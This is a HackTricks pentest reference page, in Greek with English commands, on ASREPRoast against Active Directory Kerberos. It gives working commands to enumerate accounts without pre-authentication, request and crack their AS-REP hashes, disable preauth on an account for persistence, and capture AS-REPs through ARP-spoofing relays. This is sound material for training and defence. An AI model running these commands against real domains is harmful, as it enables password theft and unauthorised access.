# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

Το ASREPRoast είναι μια επίθεση ασφαλείας που εκμεταλλεύεται χρήστες που δεν διαθέτουν το **απαιτούμενο χαρακτηριστικό προ-αυθεντικοποίησης Kerberos**. Ουσιαστικά, αυτή η ευπάθεια επιτρέπει στους επιτιθέμενους να ζητούν αυθεντικοποίηση για έναν χρήστη από τον Domain Controller (DC) χωρίς να χρειάζεται ο κωδικός πρόσβασης του χρήστη. Ο DC στη συνέχεια απαντά με ένα μήνυμα κρυπτογραφημένο με το κλειδί που προέρχεται από τον κωδικό πρόσβασης του χρήστη, το οποίο οι επιτιθέμενοι μπορούν να προσπαθήσουν να σπάσουν εκτός σύνδεσης για να ανακαλύψουν τον κωδικό πρόσβασης του χρήστη.

Οι κύριες απαιτήσεις για αυτή την επίθεση είναι:

- **Έλλειψη προ-αυθεντικοποίησης Kerberos**: Οι στοχοθετημένοι χρήστες δεν πρέπει να έχουν ενεργοποιημένο αυτό το χαρακτηριστικό ασφαλείας.
- **Σύνδεση με τον Domain Controller (DC)**: Οι επιτιθέμενοι χρειάζονται πρόσβαση στον DC για να στείλουν αιτήματα και να λάβουν κρυπτογραφημένα μηνύματα.
- **Προαιρετικός λογαριασμός τομέα**: Η ύπαρξη λογαριασμού τομέα επιτρέπει στους επιτιθέμενους να εντοπίζουν πιο αποτελεσματικά ευάλωτους χρήστες μέσω LDAP ερωτημάτων. Χωρίς έναν τέτοιο λογαριασμό, οι επιτιθέμενοι πρέπει να μαντέψουν τα ονόματα χρηστών.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Ζητήστε το μήνυμα AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Η εκτέλεση AS-REP Roasting με το Rubeus θα δημιουργήσει ένα 4768 με τύπο κρυπτογράφησης 0x17 και τύπο προαυτοποίησης 0.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Επιμονή

Αναγκάστε **preauth** που δεν απαιτείται για έναν χρήστη όπου έχετε **GenericAll** δικαιώματα (ή δικαιώματα για να γράψετε ιδιότητες):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASREProast χωρίς διαπιστευτήρια

Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει μια θέση man-in-the-middle για να συλλάβει τα πακέτα AS-REP καθώς διασχίζουν το δίκτυο χωρίς να βασίζεται στην απενεργοποίηση της προ-αυθεντικοποίησης Kerberos. Επομένως, λειτουργεί για όλους τους χρήστες στο VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) μας επιτρέπει να το κάνουμε αυτό. Επιπλέον, το εργαλείο αναγκάζει τους πελάτες σταθμούς εργασίας να χρησιμοποιούν RC4 τροποποιώντας τη διαπραγμάτευση Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}
